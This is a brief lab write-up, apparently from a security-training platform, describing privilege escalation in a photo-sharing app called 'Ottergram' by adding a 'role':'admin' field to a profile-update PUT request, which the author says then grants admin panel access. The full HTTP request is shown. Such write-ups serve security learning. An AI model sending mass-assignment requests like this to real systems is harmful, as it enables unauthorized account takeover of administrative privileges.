# Ottergram 29-07-26 (Priviledge Excalation)

In this lab, there was a "Ottogram" where you post pictures of an otter.

First, I look into the profile settings and want to change my bio.

Maybe we can get some priviledge.

```R
PUT /api/profile HTTP/1.1
Host: lab-1785329516224-30tj6a.labs-app.bugforge.io
Accept: application/json, text/plain, */*
Accept-Language: de,en-US;q=0.9,en;q=0.8
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NCwidXNlcm5hbWUiOiJDaHVteXgiLCJpYXQiOjE3ODUzMjk1Mzl9.0eJTRxwlRQD4uyOlE8XFWqapPwChXynzhoCDhu1_tBk
Content-Length: 52
Origin: https://lab-1785329516224-30tj6a.labs-app.bugforge.io
Connection: keep-alive
Referer: https://lab-1785329516224-30tj6a.labs-app.bugforge.io/profile/Chumyx
{
    "full_name":"chumyx",
    "bio":"I want to be an Admin",
    "role":"admin"
}
```

If we restart the browser we can see that we have access to admin panel


![](../assets/Ottogram29-07-26.png)